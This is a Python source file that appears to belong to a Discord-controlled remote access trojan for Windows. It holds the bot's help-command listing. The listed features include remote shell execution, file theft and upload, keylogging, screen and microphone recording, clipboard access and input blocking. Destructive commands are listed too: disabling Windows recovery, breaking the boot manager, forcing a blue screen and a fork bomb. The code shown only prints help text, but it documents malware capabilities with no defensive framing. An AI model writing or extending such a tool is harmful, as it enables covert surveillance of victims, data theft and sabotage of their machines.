"""The list of commands that the bot understands.

The list is shown by the `!help` command. It is kept in one place so the
help output always matches the commands that are registered.
"""

from discord.ext import commands
from discord.ext.commands import Context

# Every entry is the usage of the command and a short description.
COMMANDS: list[tuple[str, str]] = [
    ("!help", "Show this list of commands."),
    ("!ping", "Show the latency of the bot."),
    ("/list_devices", "Show the connected devices."),
    # Files
    ("!pwd", "Show the current folder of the file browser."),
    ("!ls", "List the content of the current folder."),
    ("!cd <path>", "Change the folder of the file browser."),
    ("!tree [depth]", "Show the structure of the current folder."),
    ("!download <path>", "Send a file of the machine to Discord."),
    ("!read <path>", "Show the content of a file as text."),
    ("!push <path>", "Copy an attachment onto the machine."),
    ("!execute <path>", "Run a file of the machine."),
    ("!run_script <path> [url]", "Save a script and run it."),
    ("!delete <path>", "Delete a file or a folder."),
    ("!move <source> <target>", "Move a file or a folder."),
    ("!clear", "Delete the messages of this channel."),
    ("!upload [url]", "Download a file and send it to Discord."),
    # Machine
    ("!shell <command>", "Run a PowerShell command."),
    ("!cmd <command>", "Run a command in the command prompt."),
    ("!ps", "List the processes that are running."),
    ("!show processes", "Show the processes that are running."),
    ("!kill <name|number>", "Kill a process by name or by number."),
    ("!foreground", "Show the process of the foreground window."),
    ("!blacklist <name>", "Kill a process again when it starts."),
    ("!whitelist <name>", "Remove a process from the blacklist."),
    ("!keys <text>", "Type on the machine, ALTF4 and ALTTAB work too."),
    ("!block-input", "Block the keyboard and the mouse."),
    ("!unblock-input", "Unblock the keyboard and the mouse."),
    ("!volume <0-100>", "Set the volume of the speakers."),
    ("!monitors <on|off>", "Turn the monitors of the machine on or off."),
    ("!play <file>", "Play a wav, mp3 or midi file."),
    ("!display [seconds]", "Show an attachment fullscreen on the machine."),
    ("!glitch <effect> [seconds]", "Run a screen effect, `!glitch list` shows them."),
    ("!screenrec [seconds]", "Record the screen into a video."),
    ("!record [seconds]", "Record the microphone into a wav file."),
    ("!wallpaper", "Set the wallpaper from an attachment."),
    ("!clipboard [read|write]", "Read or write the clipboard."),
    ("!openurl <url>", "Open a URL in the browser."),
    ("!block-website <url>", "Block a website with the hosts file."),
    ("!unblock-website <url>", "Unblock a website of the hosts file."),
    # Discord and the runtime
    ("!screenshot", "Take a screenshot of the machine."),
    ("!voice <text>", "Speak a text with the Windows voice."),
    ("!tts <text>", "Speak a text with the Windows voice."),
    ("!join", "Stream the microphone into a voice channel."),
    ("!leave", "Leave the voice channel."),
    ("!keylog <start|stop|status>", "Write the typed keys into the key log."),
    ("!popup <text>", "Show a Windows message box."),
    ("!msgbox <options> \"prompt\"", "Show a Windows form with buttons."),
    ("!inputbox <prompt>", "Show a Windows form with a text field."),
    ("!replacer <action>", "Start, stop or check the text replacer."),
    ("!replacements <rules>", "Manage the rules of the text replacer."),
    # Destructive
    ("!critical <set|unset>", "Raise or lower the critical status."),
    ("!disable-reset", "Disable the Windows recovery environment."),
    ("!enable-reset", "Enable the Windows recovery environment."),
    ("!break-windows", "Rename the boot manager of Windows."),
    ("!bsod", "Trigger a blue screen of death."),
    ("!forkbomb", "Start a fork bomb, the machine will freeze."),
    ("!shutdown [seconds]", "Shut the machine down."),
    ("!restart [seconds]", "Restart the machine."),
    ("!restart_bot", "Restart the runtime itself."),
    ("!exit", "Stop the runtime process."),
    ("!update_app", "Update the runtime to the newest release."),
    ("!implode", "Remove the runtime from the machine."),
]

# Number of commands that are listed in one message.
COMMANDS_PER_MESSAGE = 12

# The alternative names of the commands above.
ALIASES: list[str] = [
    "!ss",
    "!cmd",
    "!tts",
    "!pull",
    "!remove",
    "!deploy",
    "!processes",
    "!set-critical",
    "!unset-critical",
]


async def show_help(ctx: Context[commands.Bot]) -> None:
    """Show the list of all commands."""
    await ctx.reply("**Commands of the runtime**\n" + "```" + "\n".join(
        f"{usage:<34} {description}" for usage, description in COMMANDS[:COMMANDS_PER_MESSAGE]
    ) + "```")

    for start in range(COMMANDS_PER_MESSAGE, len(COMMANDS), COMMANDS_PER_MESSAGE):
        chunk = COMMANDS[start : start + COMMANDS_PER_MESSAGE]
        await ctx.send(
            "```"
            + "\n".join(f"{usage:<34} {description}" for usage, description in chunk)
            + "```"
        )

    await ctx.send("**Aliases**\n```" + "  ".join(ALIASES) + "```")
